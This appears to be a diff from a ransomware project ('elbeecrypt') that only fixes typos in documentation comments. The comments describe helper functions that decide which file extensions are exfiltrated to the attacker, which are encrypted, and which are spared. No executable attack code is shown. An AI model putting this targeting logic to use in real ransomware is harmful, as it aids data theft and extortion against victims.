@@ -136,7 +136,7 @@ namespace elbeecrypt::common::targets::Extensions {
 	 * exfiltrated to the attacker by the ransomware, ie: the 
 	 * extension is in a list of exfiltratable extensions. The
 	 * extension, in addition, is also encryptable, so this check
-	 * may be subsituted in place.
+	 * may be substituted in place.
 	 * 
 	 * @param extension The extension to check
 	 * @return Whether the extension is allowed to be exfiltrated
@@ -148,7 +148,7 @@ namespace elbeecrypt::common::targets::Extensions {
 	 * be exfiltrated to the attacker by the ransomware, ie: the 
 	 * referenced file is in a list of exfiltratable extensions. The
 	 * extension, in addition, is also encryptable, so this check
-	 * may be subsituted in place.
+	 * may be substituted in place.
 	 * 
 	 * @param extension The path to check
 	 * @return Whether the file at the given path is allowed to be exfiltrated
@@ -192,7 +192,7 @@ namespace elbeecrypt::common::targets::Extensions {
 
 	/**
 	 * @brief Indicates whether the file at a given path should
-	 * be sapred by the ransomware either because its extension
+	 * be spared by the ransomware either because its extension
 	 * is in the list of extensions to pass or its extension isn't 
 	 * recognized.
 	 * 
